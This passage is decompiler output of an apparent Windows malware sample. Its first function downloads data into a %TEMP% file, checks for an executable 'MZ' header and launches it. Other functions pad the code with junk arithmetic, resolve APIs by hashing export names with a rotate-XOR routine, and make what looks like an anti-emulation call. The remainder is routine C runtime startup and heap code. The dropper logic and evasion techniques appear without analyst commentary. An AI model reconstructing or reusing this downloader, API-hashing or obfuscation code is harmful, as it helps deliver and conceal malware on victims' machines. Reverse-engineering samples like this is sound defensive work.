    dword_4056A0("TEMP", FileName, 260);
    v23 = (4 * v23) ^ ((4 * v22) >> (8 * v22));
    lstrcatA(FileName, "\\");
    for ( k = 0; k <= 1; ++k )
      v22 = ((v22 - 3928) >> (21 - v22)) & (2 * v23 + 201) & ((-7198 - 8 * v22) << (2 * v23 + 2));
    lstrcatA(FileName, lpString2);
    v22 = (2 * (v21 + v23) + 164) | (2 * v21) | -((2 * v23 + 195) * (2 * v21 + 4282)) & (8 * v22 + 7294) & (2 * (v23 + v22) + 39);
    v7 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0, 0);
    v15 = 0;
    v14 = 0;
    do
    {
      dword_4056B4(v2, Buffer, 1024, &nNumberOfBytesToWrite);
      if ( !v14 )
      {
        v14 = 1;
        if ( Buffer[0] == 77 )
        {
          v14 = 1;
          if ( Buffer[1] == 90 )
          {
            v15 = 1;
            v14 = 1;
          }
        }
      }
      for ( l = 0; l <= 4; l += 5 )
        v22 = 0;
      WriteFile(v7, Buffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
      for ( m = 9; m >= 0; m -= 2 )
        v21 = (-6756 - 8 * v21) ^ (8 * v22);
    }
    while ( nNumberOfBytesToWrite );
    CloseHandle(v7);
    for ( n = 0; n <= 10; n += 4 )
      v21 = (4 * v23 + 6717) * (4 * v21 + 1021);
    Sleep(0x103u);
    for ( ii = 10; ii >= 0; --ii )
      v23 = (-8 * v22) ^ (4 * v23 + 3083) ^ ((v23 + 4902) << (4 * v21 * 4 * v21 * (v21 + 97) * (2 * v21 - 65)));
    if ( v15 )
      dword_4056BC(0, "open", FileName, 0, 0, 8);
    v21 = (2 * v21 + 100) ^ (2 * v22 + 161) & (v21 + 8312) | (4 * v21 + 9092);
  }
  dword_4056B8(v2);
  v11 = 10;
  do
  {
    v22 = 0;
    v4 = v11 < 4;
    v11 -= 4;
  }
  while ( !v4 );
  return dword_4056B8(v1);
}
// 401D54: variable 'lpString2' is possibly undefined
// 4056A0: using guessed type int (__stdcall *dword_4056A0)(_DWORD, _DWORD, _DWORD);
// 4056AC: using guessed type int (__stdcall *dword_4056AC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4056B0: using guessed type int (__stdcall *dword_4056B0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4056B4: using guessed type int (__stdcall *dword_4056B4)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4056B8: using guessed type int (__stdcall *dword_4056B8)(_DWORD);
// 4056BC: using guessed type int (__stdcall *dword_4056BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401FB5) --------------------------------------------------------
int __stdcall sub_401FB5(int a1, int a2)
{
  int v2; // esi
  int i; // eax
  _DWORD *v4; // edi
  int j; // eax
  int k; // edx
  int l; // eax
  unsigned int v9; // [esp+14h] [ebp-24h]
  int v10; // [esp+18h] [ebp-20h]
  int v11; // [esp+1Ch] [ebp-1Ch]
  int v12; // [esp+28h] [ebp-10h]
  int v13; // [esp+2Ch] [ebp-Ch]
  int v14; // [esp+30h] [ebp-8h]
  int v15; // [esp+34h] [ebp-4h]

  v2 = a2;
  for ( i = 0; i <= 5; i += 5 )
    v13 = (v13 + 9498) * (v13 + 6379);
  v4 = (_DWORD *)(a1 + *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120));
  v12 = a1 + v4[9];
  for ( j = 0; j <= 5; j += 3 )
    v14 = 8 * v15;
  if ( !StgCreateStorageEx(0, 0, 0, 0, 0, 0, 0, 0) )
    v2 = a2 - 236511;
  for ( k = 0; ; ++k )
  {
    if ( k >= v4[6] )
      return 0;
    v11 = a1 + *(_DWORD *)(a1 + v4[8] + 4 * k);
    v10 = 0;
    v9 = 0;
    while ( *(_BYTE *)(v10 + v11) )
    {
      v14 = (4 * v15) | (8 * v14 + 279) | ((4 * v14) << (2 * v14));
      v9 = ((v9 >> 25) | (v9 << 7)) ^ *(char *)(v10 + v11) ^ 0x6A;
      ++v10;
    }
    if ( v9 == v2 )
      break;
  }
  for ( l = 0; l <= 4; l += 2 )
    ;
  return a1 + *(_DWORD *)(a1 + v4[7] + 4 * *(unsigned __int16 *)(v12 + 2 * k));
}
// 401FD2: variable 'v13' is possibly undefined
// 402003: variable 'v15' is possibly undefined

//----- (00402120) --------------------------------------------------------
void __noreturn start()
{
  void (**i)(void); // ebx
  HMODULE v1; // ebx
  LPSTR v2; // eax
  int v3; // edx
  int v4; // ebx
  void (**j)(void); // esi
  struct _STARTUPINFOA StartupInfo; // [esp+Ch] [ebp-60h] BYREF
  CPPEH_RECORD ms_exc; // [esp+54h] [ebp-18h]

  dwSize = sub_402CF0(0x2000000);
  if ( !sub_4024E0() )
    sub_4025D0(1u);
  ms_exc.registration.TryLevel = 0;
  sub_4025E0();
  sub_402650();
  __ioinit();
  sub_402A80();
  sub_402B20();
  for ( i = dword_4040DC; i < dword_4040DC; ++i )
    (*i)();
  StartupInfo.dwFlags = 0;
  GetStartupInfoA(&StartupInfo);
  v1 = GetModuleHandleA(0);
  v2 = sub_402BE0();
  if ( (StartupInfo.dwFlags & 1) != 0 )
    v3 = StartupInfo.wShowWindow;
  else
    v3 = 10;
  v4 = sub_401000((int)v1, 0, (int)v2, v3);
  for ( j = dword_4040DC; j < dword_4040DC; ++j )
    (*j)();
  sub_402C20(v4);
}
// 402120: using guessed type void __noreturn start();

//----- (00402248) --------------------------------------------------------
int __cdecl sub_402248(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_4023F0(a2 + 16, a2, 0xFFFFFFFF);
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *(_DWORD *)(a2 - 4) = v12;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
      if ( v7 )
      {
        v8 = v7(0, 0);
        v4 = v3[3];
        if ( v8 )
        {
          if ( v8 < 0 )
            return 0;
          v9 = *(_DWORD *)(v4 + 8);
          sub_402390((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_4023F0(v4 + 16, v4, v5);
          sub_4024B9(*(_DWORD *)(v9 + 12 * v5 + 8), v4 + 16, 1);
          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v9 + 4 * v10);
          v4 = 0;
          v5 = 0;
          (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 40230A: variable 'v10' is possibly undefined

//----- (00402390) --------------------------------------------------------
void __cdecl sub_402390(void *a1)
{
  RtlUnwind(a1, &loc_4023AC, 0, 0);
}

//----- (004023C0) --------------------------------------------------------
int __cdecl sub_4023C0(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (004023F0) --------------------------------------------------------
int __usercall sub_4023F0@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_4023C0;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_4024B9(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        v7,
        v8);
    }
  }
  return result;
}
// 402457: variable 'v7' is possibly undefined
// 402457: variable 'v8' is possibly undefined

//----- (004024B9) --------------------------------------------------------
int __userpurge sub_4024B9@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_40500C[2] = a3;
  dword_40500C[1] = result;
  dword_40500C[3] = a2;
  return result;
}

//----- (004024E0) --------------------------------------------------------
BOOL sub_4024E0()
{
  hHeap = HeapCreate(1u, 0x1000u, 0);
  return hHeap != 0;
}

//----- (00402530) --------------------------------------------------------
LPVOID __cdecl sub_402530(SIZE_T dwBytes)
{
  return HeapAlloc(hHeap, 1u, dwBytes);
}

//----- (00402570) --------------------------------------------------------
BOOL __cdecl sub_402570(LPVOID lpMem)
{
  return HeapFree(hHeap, 1u, lpMem);
}

//----- (004025D0) --------------------------------------------------------
void __cdecl __noreturn sub_4025D0(UINT uExitCode)
{
  ExitProcess(uExitCode);
}

//----- (004025E0) --------------------------------------------------------
int sub_4025E0()
{
  unsigned int v0; // kr00_4
  unsigned int v1; // kr04_4
  int result; // eax

  v0 = __readeflags();
  __writeeflags(v0 ^ 0x200000);
  v1 = __readeflags();
  result = v0 ^ v1;
  if ( v0 != v1 )
  {
    __writeeflags(v0);
    _EAX = 0;
    __asm { cpuid }
    if ( result >= 1 )
    {
      _EAX = 1;
      __asm { cpuid }
      result = (_EDX & 0x800000) != 0;
      if ( (_EDX & 0x1000000) != 0 )
        result |= 0x10u;
      if ( (_EDX & 0x2000000) != 0 )
        result |= 2u;
      if ( (_EDX & 0x4000000) != 0 )
        result |= 4u;
      if ( (_ECX & 1) != 0 )
        result |= 8u;
      dword_4050EC = result;
    }
  }
  return result;
}
// 4050EC: using guessed type int dword_4050EC;

//----- (00402650) --------------------------------------------------------
void sub_402650()
{
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
}

//----- (004026A0) --------------------------------------------------------
UINT __ioinit()
{
  LPVOID v0; // eax
  unsigned int v1; // ebx
  signed int v2; // esi
  int v3; // edi
  LPVOID v4; // eax
  unsigned int v5; // ebx
  int i; // edi
  int v7; // ebx
  int j; // edi
  int v9; // ebx
  DWORD v10; // eax
  HANDLE v11; // eax
  HANDLE v12; // esi
  HANDLE v13; // eax
  HANDLE hSourceProcessHandle; // [esp+Ch] [ebp-58h]
  DWORD v16; // [esp+10h] [ebp-54h]
  LPBYTE v17; // [esp+14h] [ebp-50h]
  HANDLE *v18; // [esp+18h] [ebp-4Ch]
  HANDLE TargetHandle; // [esp+1Ch] [ebp-48h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+20h] [ebp-44h] BYREF

  v0 = sub_4032C0(0x100u);
  v1 = (unsigned int)v0;
  if ( !v0 )
    sub_4025D0(1u);
  dword_405FE8[0] = (int)v0;
  uNumber = 32;
  while ( v1 < dword_405FE8[0] + 256 )
  {
    *(_BYTE *)(v1 + 4) = 0;
    *(_DWORD *)v1 = -1;
    *(_BYTE *)(v1 + 5) = 10;
    v1 += 8;
  }
  GetStartupInfoA(&StartupInfo);
  if ( StartupInfo.cbReserved2 && StartupInfo.lpReserved2 )
  {
    v2 = *(_DWORD *)StartupInfo.lpReserved2;
    v17 = StartupInfo.lpReserved2 + 4;
    v18 = (HANDLE *)&StartupInfo.lpReserved2[*(_DWORD *)StartupInfo.lpReserved2 + 4];
    if ( *(int *)StartupInfo.lpReserved2 > 2048 )
      v2 = 2048;
    v3 = 1;
    if ( (int)uNumber < v2 )
    {
      while ( 1 )
      {
        v4 = sub_4032C0(0x100u);
        v5 = (unsigned int)v4;
        if ( !v4 )
          break;
        dword_405FE8[v3] = (int)v4;
        uNumber += 32;
        while ( v5 < dword_405FE8[v3] + 256 )
        {
          *(_BYTE *)(v5 + 4) = 0;
          *(_DWORD *)v5 = -1;
          *(_BYTE *)(v5 + 5) = 10;
          v5 += 8;
        }
        ++v3;
        if ( (int)uNumber >= v2 )
          goto LABEL_17;
      }
      v2 = uNumber;
    }
LABEL_17:
    for ( i = 0; i < v2; ++v18 )
    {
      if ( *v18 != (HANDLE)-1 && (*v17 & 1) != 0 && ((*v17 & 8) != 0 || GetFileType(*v18)) )
      {
        v7 = dword_405FE8[i >> 5] + 8 * (i & 0x1F);
        *(_DWORD *)v7 = *v18;
        *(_BYTE *)(v7 + 4) = *v17;
      }
      ++i;
      ++v17;
    }
  }
  for ( j = 0; j < 3; ++j )
  {
    v9 = dword_405FE8[0] + 8 * j;
    if ( *(_DWORD *)v9 == -1 )
    {
      *(_BYTE *)(v9 + 4) = -127;
      if ( j )
      {
        if ( j == 1 )
          v10 = -11;
        else
          v10 = -12;
      }
      else
      {
        v10 = -10;
      }
      v11 = GetStdHandle(v10);
      v12 = v11;
      if ( v11 == (HANDLE)-1 || (v16 = GetFileType(v11)) == 0 )
      {
        *(_BYTE *)(v9 + 4) |= 0x40u;
      }
      else
      {
        hSourceProcessHandle = GetCurrentProcess();
        v13 = GetCurrentProcess();
        if ( DuplicateHandle(hSourceProcessHandle, v12, v13, &TargetHandle, 0, 1, 2u) )
          v12 = TargetHandle;
        *(_DWORD *)v9 = v12;
        if ( (unsigned __int8)v16 == 2 )
        {
          *(_BYTE *)(v9 + 4) |= 0x40u;
        }
        else if ( (unsigned __int8)v16 == 3 )
        {
          *(_BYTE *)(v9 + 4) |= 8u;
        }
      }
    }
    else
    {
      *(_BYTE *)(v9 + 4) |= 0x80u;
    }
  }
  return SetHandleCount(uNumber);
}

//----- (004028F0) --------------------------------------------------------
_DWORD *__cdecl sub_4028F0(char *a1, char **a2, char *a3, _DWORD *a4, _DWORD *a5)
{
  char **v5; // edx
  char *v6; // ebx
  char *v7; // edi
  char *v8; // eax
  char v9; // al
  char v11; // al
  _DWORD *result; // eax
  unsigned int v13; // [esp+Ch] [ebp-10h]
  int v14; // [esp+14h] [ebp-8h]
  BOOL v15; // [esp+18h] [ebp-4h]

  v5 = a2;
  v6 = a3;
  *a5 = 0;
  *a4 = 1;
  v7 = a1;
  if ( a2 )
  {
    *a2 = a3;
    v5 = a2 + 1;
  }
  if ( *a1 == 34 )
  {
    while ( *++v7 != 34 && *v7 )
    {
      if ( v6 )
        *v6++ = *v7;
      ++*a5;
    }
    if ( v6 )
      *v6++ = 0;
    ++*a5;
    if ( *v7 == 34 )
      ++v7;
  }
  else
  {
    do
    {
      if ( v6 )
        *v6++ = *v7;
      ++*a5;
      v8 = v7++;
      v9 = *v8;
    }
    while ( v9 != 32 && v9 && v9 != 9 );
    if ( v9 )
    {
      if ( v6 )
        *(v6 - 1) = 0;
    }
    else
    {
      --v7;
    }
  }
  v15 = 0;
  while ( 1 )
  {
    if ( *v7 )
    {
      while ( *v7 == 32 || *v7 == 9 )
        ++v7;
    }
    if ( !*v7 )
      break;
    if ( v5 )
      *v5++ = v6;
    ++*a4;
    while ( 1 )
    {
      v13 = 0;
      while ( *v7 == 92 )
      {
        ++v7;
        ++v13;
      }
      v14 = 1;
      if ( *v7 == 34 )
      {
        v14 = 1;
        if ( (v13 & 1) == 0 )
        {
          if ( v15 )
          {
            if ( v7[1] == 34 )
            {
              ++v7;
              v14 = 1;
            }
            else
            {
              v14 = 0;
            }
          }
          else
          {
            v14 = 0;
          }
          v15 = !v15;
        }
        v13 >>= 1;
      }
      while ( v13-- )
      {
        if ( v6 )
          *v6++ = 92;
        ++*a5;
      }
      v11 = *v7;
      if ( !*v7 || !v15 && (v11 == 32 || v11 == 9) )
        break;
      if ( v14 )
      {
        if ( v6 )
          *v6++ = *v7;
        ++*a5;
      }
      ++v7;
    }
    if ( v6 )
      *v6++ = 0;
    ++*a5;
  }
  if ( v5 )
    *v5 = 0;
  result = a4;
  ++*a4;
  return result;
}

//----- (00402A80) --------------------------------------------------------
int sub_402A80()
{
  LPSTR v0; // ebx
  char **v1; // eax
  int v2; // esi
  int result; // eax
  CHAR Filename[260]; // [esp+8h] [ebp-10Ch] BYREF
  int v5; // [esp+10Ch] [ebp-8h] BYREF
  int v6; // [esp+110h] [ebp-4h] BYREF

  v0 = GetCommandLineA();
  if ( !*v0 )
  {
    GetModuleFileNameA(0, Filename, 0x104u);
    v0 = Filename;
  }
  sub_4028F0(v0, 0, 0, &v6, &v5);
  v1 = (char **)sub_4032C0(v5 + 4 * v6);
  v2 = (int)v1;
  if ( !v1 )
    sub_4025D0(1u);
  sub_4028F0(v0, v1, (char *)&v1[v6], &v6, &v5);
  result = v6 - 1;
  dword_40501C = v6 - 1;
  dword_405020 = v2;
  return result;
}
// 40501C: using guessed type int dword_40501C;
// 405020: using guessed type int dword_405020;

//----- (00402B20) --------------------------------------------------------
char *sub_402B20()
{
  CHAR *v0; // ebx
  CHAR *v1; // esi
  int v2; // ecx
  int v3; // eax
  char *result; // eax
  char *v5; // edi
  const char *i; // esi
  int v7; // eax
  int v8; // [esp+Ch] [ebp-4h]
  int v9; // [esp+Ch] [ebp-4h]

  v0 = GetEnvironmentStrings();
  if ( !v0 )
    v0 = (CHAR *)off_4050F0;
  v1 = v0;
  v2 = 0;
  while ( *v1 )
  {
    v3 = -1;
    do
      ++v3;
    while ( v1[v3] );
    v8 = v3 + 1;
    if ( *v1 != 61 )
      v2 += v8;
    v1 += v8;
  }
  result = (char *)sub_4032C0(v2 + 1);
  v5 = result;
  dword_405028 = (int)result;
  if ( !result )
    sub_4025D0(1u);
  for ( i = v0; *i; i += v9 )
  {
    v7 = -1;
    do
      ++v7;
    while ( i[v7] );
    v9 = v7 + 1;
    if ( *i != 61 )
    {
      strcpy(v5, i);
      v5 += v9;
    }
    result = (char *)v9;
  }
  *v5 = 0;
  if ( v0 != off_4050F0 )
    result = (char *)FreeEnvironmentStringsA(v0);
  return result;
}
// 405028: using guessed type int dword_405028;
// 4050F0: using guessed type void *off_4050F0;

//----- (00402BE0) --------------------------------------------------------
LPSTR sub_402BE0()
{
  LPSTR v0; // edx

  v0 = GetCommandLineA();
  if ( *v0 == 34 )
  {
    do
      ++v0;
    while ( *v0 != 34 && *v0 );
    if ( *v0 == 34 )
      ++v0;
  }
  else
  {
    while ( (unsigned __int8)*v0 > 0x20u )
      ++v0;
  }
  while ( *v0 && (unsigned __int8)*v0 <= 0x20u )
    ++v0;
  return v0;
}

//----- (00402C20) --------------------------------------------------------
void __cdecl __noreturn sub_402C20(UINT uExitCode)
{
  int v1; // eax

  while ( (unsigned int)dword_405234 < 0x50 )
  {
    v1 = dword_405234++;
    ((void (*)(void))funcs_402C3C[v1])();
  }
  while ( dword_405238 )
    ((void (*)(void))funcs_402C3C[--dword_405238])();
  sub_4025D0(uExitCode);
}
// 405234: using guessed type int dword_405234;
// 405238: using guessed type int dword_405238;

//----- (00402C80) --------------------------------------------------------
LONG __cdecl sub_402C80(int a1, struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  _DWORD *i; // esi
  int v3; // eax
  void (__cdecl *v4)(_DWORD); // edi

  for ( i = &unk_404088; ; i += 2 )
  {
    if ( i >= &dword_4040D8 )
      return UnhandledExceptionFilter(ExceptionInfo);
    if ( *i == a1 )
      break;
  }
  v3 = sub_4036A0(i[1], 1);
  v4 = (void (__cdecl *)(_DWORD))v3;
  if ( v3 == -1 || !v3 )
    return UnhandledExceptionFilter(ExceptionInfo);
  if ( v3 != 1 )
  {
    sub_4036A0(i[1], 0);
    v4(i[1]);
  }
  return -1;
}

//----- (00402CF0) --------------------------------------------------------
int __cdecl sub_402CF0(int a1)
{
  return a1;
}

//----- (00402D00) --------------------------------------------------------
int __stdcall sub_402D00(__int64 a1, unsigned __int64 a2)
{
  int result; // eax
  unsigned __int64 v3; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  char v7; // cf
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  if ( HIDWORD(a1) )
  {
    v4 = HIDWORD(a1);
    v5 = a1;
    v6 = a2;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = v6 / v5;
    v9 = v8 * (unsigned __int64)(unsigned int)a1;
    if ( __CFADD__(HIDWORD(a1) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a1 * (unsigned __int64)v8) >> 32, v9 > a2) )
      --v8;
    result = v8;
  }
  else
  {
    LODWORD(v3) = a2;
    HIDWORD(v3) = HIDWORD(a2) % (unsigned int)a1;
    result = v3 / (unsigned int)a1;
  }
  return result;
}

//----- (00402D70) --------------------------------------------------------
int __cdecl grabhunk(int a1)
{
  unsigned int v1; // ebx
  SIZE_T v2; // esi
  int *v3; // eax
  int result; // eax
  int *v5; // edi
  int v6; // eax
  unsigned int *v7; // edi
  unsigned int v8; // ebx
  unsigned int v9; // ebx
  unsigned int *v10; // edi
  int v11; // eax
  int v12; // eax
  int v13; // edx
  unsigned int *v14; // edi
  unsigned int v15; // eax

  v1 = (((unsigned int)(a1 + 3) >> 14) + 1) << 14;
  v2 = (((unsigned int)(a1 + 3) >> 14) + 1) << 16;
  v3 = (int *)sub_403700(v2);
  if ( v3 )
  {
    if ( (int *)(dword_405680 + dword_405684) == v3 )
    {
      v5 = (int *)dword_405680;
      v2 += dword_405684;
      v1 = v2 >> 2;
    }
    else
    {
      v5 = v3;
    }
    dword_405680 = (int)&v5[v1];
    dword_405684 = v2 - 4 * v1;
    if ( (int *)(dword_405260 + 4) == v5 && dword_405268 )
    {
      v14 = (unsigned int *)(v5 - 1);
      v15 = v1 + (*v14 & 0x7FFFFFFF);
      *v14 = v1 | 0x80000000;
      dword_405260 += 4 * v1;
      *(_DWORD *)(dword_405260 - 4) = *v14;
      *(_DWORD *)dword_405260 = v15 | 0x80000000;
      *(_DWORD *)(dword_405260 - 4 * v15 + 4) = v15 | 0x80000000;
      sub_403620(v14 + 1);
      result = 1;
    }
    else
    {
      v6 = dword_405268;
      dword_405268 = (int)v5;
      *v5 = v6;
      v7 = (unsigned int *)(v5 + 1);
      v8 = v1 - 1;
      dword_405260 = (int)v7;
      if ( !dword_405264 || dword_405264 > (unsigned int)v7 )
        dword_405264 = (int)v7;
      *v7 = v8 | 0x80000000;
      dword_405260 = dword_405260 + 4 * v8 - 4;
      *(_DWORD *)dword_405260 = v8 | 0x80000000;
      v9 = v8 - 2;
      v10 = (unsigned int *)(dword_405260 - 4);
      if ( v9 > dword_405278 )
      {
        if ( v9 > dword_405280 )
        {
          if ( v9 > dword_405284 )
            v11 = 7;
          else
            v11 = 6;
        }
        else
        {
          v11 = v9 <= dword_40527C ? 4 : 5;
        }
      }
      else if ( v9 > dword_405270 )
      {
        if ( v9 > dword_405274 )
          v11 = 3;
        else
          v11 = 2;
      }
      else
      {
        v11 = v9 > dword_40526C;
      }
      dword_405290 = v11;
      v12 = dword_40523C[v11];
      if ( v12 )
      {
        v13 = *(_DWORD *)(v12 - 8);
      }
      else
      {
        v13 = dword_405260 - 4;
        v12 = dword_405260 - 4;
        dword_40523C[dword_405290] = (int)v10;
        if ( dword_40528C > dword_405290 )
          dword_40528C = dword_405290;
      }
      *(v10 - 1) = v12;
      *(_DWORD *)(v12 - 8) = v10;
      *(_DWORD *)(v13 - 4) = v10;
      *(v10 - 2) = v13;
      v10[-v9 + 1] = v9;
      *v10 = v9;
      dword_40523C[dword_405290] = (int)v10;
      while ( !dword_40523C[dword_40528C] && dword_40528C < 7 )
        ++dword_40528C;
      result = 1;
    }
  }
  else
  {
    dword_405038 = 0;
    result = 0;
  }
  return result;
}
// 405038: using guessed type int dword_405038;
// 405260: using guessed type int dword_405260;
// 405264: using guessed type int dword_405264;
// 405268: using guessed type int dword_405268;
// 40526C: using guessed type int dword_40526C;
// 405270: using guessed type int dword_405270;
// 405274: using guessed type int dword_405274;
// 405278: using guessed type int dword_405278;
// 40527C: using guessed type int dword_40527C;
// 405280: using guessed type int dword_405280;
// 405284: using guessed type int dword_405284;
// 40528C: using guessed type int dword_40528C;
// 405290: using guessed type int dword_405290;
// 405680: using guessed type int dword_405680;
// 405684: using guessed type int dword_405684;

//----- (00402FC0) --------------------------------------------------------
int __cdecl _sheap_alloc(int a1)
{
  unsigned int v1; // ebx
  int v2; // eax
  int v3; // esi
  unsigned int *v4; // edi
  int v5; // eax
  unsigned int *v6; // eax
  int result; // eax
  unsigned int v8; // eax
  int v9; // edx
  unsigned int *v10; // edx
  int v11; // ecx
  int v12; // edx
  unsigned int *v13; // eax
  int v14; // edx
  unsigned int *v15; // edx
  unsigned int *v16; // [esp+Ch] [ebp-14h]
  int v17; // [esp+18h] [ebp-8h]
  unsigned int v18; // [esp+1Ch] [ebp-4h]

  v1 = ((unsigned int)(a1 + 3) >> 2) + 2;
  if ( v1 < 4 )
    v1 = 4;
  if ( v1 > dword_405278 )
  {
    if ( v1 > dword_405280 )
    {
      if ( v1 > dword_405284 )
        v2 = 7;
      else
        v2 = 6;
    }
    else
    {
      v2 = v1 <= dword_40527C ? 4 : 5;
    }
  }
  else if ( v1 > dword_405270 )
  {
    if ( v1 > dword_405274 )
      v2 = 3;
    else
      v2 = 2;
  }
  else
  {
    v2 = v1 > dword_40526C;
  }
  v3 = v2;
  v4 = 0;
  v18 = 0;
  if ( v2 < dword_40528C )
  {
    v3 = dword_40528C;
    v18 = 0;
    v4 = 0;
  }
  while ( v18 < v1 && v3 < 8 )
  {
    v5 = v3++;
    v4 = (unsigned int *)dword_40523C[v5];
    if ( v4 )
    {
      if ( (unsigned int *)(dword_405260 - 4) == v4 )
        v4 = (unsigned int *)*(v4 - 1);
      v6 = v4;
      do
      {
        v18 = *v4;
        if ( *v4 >= v1 )
          break;
        v4 = (unsigned int *)*(v4 - 1);
      }
      while ( v4 != v6 );
    }
  }
  if ( v18 >= v1 )
  {
    if ( v3 > 0 )
      --v3;
  }
  else
  {
    result = grabhunk(v1);
    if ( !result )
      return result;
    v3 = dword_405290;
    v4 = (unsigned int *)dword_40523C[dword_405290];
    v18 = *v4;
  }
  v8 = v18 - v1;
  if ( v18 - v1 < 4 )
  {
    v13 = (unsigned int *)*(v4 - 1);
    if ( v4 == v13 )
    {
      dword_40523C[v3] = 0;
      if ( dword_40528C == v3 )
      {
        while ( !dword_40523C[dword_40528C] && dword_40528C < 7 )
          ++dword_40528C;
      }
    }
    else
    {
      v14 = *(v4 - 2);
      *(_DWORD *)(v14 - 4) = v13;
      *(v13 - 2) = v14;
      if ( (unsigned int *)dword_40523C[v3] == v4 )
        dword_40523C[v3] = v14;
    }
    v1 = v18;
  }
  else
  {
    if ( v8 > dword_405278 )
    {
      if ( v8 > dword_405280 )
      {
        if ( v8 > dword_405284 )
          v17 = 7;
        else
          v17 = 6;
      }
      else
      {
        v17 = v8 <= dword_40527C ? 4 : 5;
      }
    }
    else
    {
      if ( v8 > dword_405270 )
      {
        if ( v8 > dword_405274 )
          v9 = 3;
        else
          v9 = 2;
      }
      else
      {
        v9 = v8 > dword_40526C;
      }
      v17 = v9;
    }
    if ( v17 == v3 )
    {
      v4[-v8 + 1] = v8;
      *v4 = v8;
    }
    else
    {
      v10 = (unsigned int *)*(v4 - 1);
      if ( v4 == v10 )
      {
        dword_40523C[v3] = 0;
        if ( dword_40528C == v3 )
        {
          while ( !dword_40523C[dword_40528C] && dword_40528C < 7 )
            ++dword_40528C;
        }
      }
      else
      {
        v11 = *(v4 - 2);
        *(_DWORD *)(v11 - 4) = v10;
        *(v10 - 2) = v11;
        if ( (unsigned int *)dword_40523C[v3] == v4 )
          dword_40523C[v3] = v11;
      }
      v12 = dword_40523C[v17];
      if ( v12 )
      {
        v16 = *(unsigned int **)(v12 - 8);
      }
      else
      {
        v16 = v4;
        v12 = (int)v4;
        dword_40523C[v17] = (int)v4;
        if ( dword_40528C > v17 )
          dword_40528C = v17;
      }
      *(v4 - 1) = v12;
      *(_DWORD *)(v12 - 8) = v4;
      *(v16 - 1) = (unsigned int)v4;
      *(v4 - 2) = (unsigned int)v16;
      v4[-v8 + 1] = v8;
      *v4 = v8;
    }
  }
  v15 = &v4[-v18 + 1];
  v15[v1 - 1] = v1 | 0x80000000;
  *v15 = v1 | 0x80000000;
  return (int)&v4[-v18 + 2];
}
// 405260: using guessed type int dword_405260;
// 40526C: using guessed type int dword_40526C;
// 405270: using guessed type int dword_405270;
// 405274: using guessed type int dword_405274;
// 405278: using guessed type int dword_405278;
// 40527C: using guessed type int dword_40527C;
// 405280: using guessed type int dword_405280;
// 405284: using guessed type int dword_405284;
// 40528C: using guessed type int dword_40528C;
// 405290: using guessed type int dword_405290;

//----- (004032C0) --------------------------------------------------------
LPVOID __cdecl sub_4032C0(SIZE_T dwBytes)
{
  LPVOID v1; // esi

  v1 = 0;
  if ( dwBytes < dword_405038 )
    v1 = (LPVOID)_sheap_alloc(dwBytes);
  if ( !v1 )
    v1 = sub_402530(dwBytes);
  if ( !v1 )
    dword_405298 = 12;
  return v1;
}
// 405038: using guessed type int dword_405038;
// 405298: using guessed type int dword_405298;

//----- (00403300) --------------------------------------------------------
unsigned int __cdecl _sheap_free(unsigned int a1)
{
  unsigned int result; // eax
  _DWORD *v2; // edx
  int *v3; // ebx
  unsigned int *v4; // edx
  unsigned int *v5; // esi
  int v6; // ecx
  int v7; // ecx
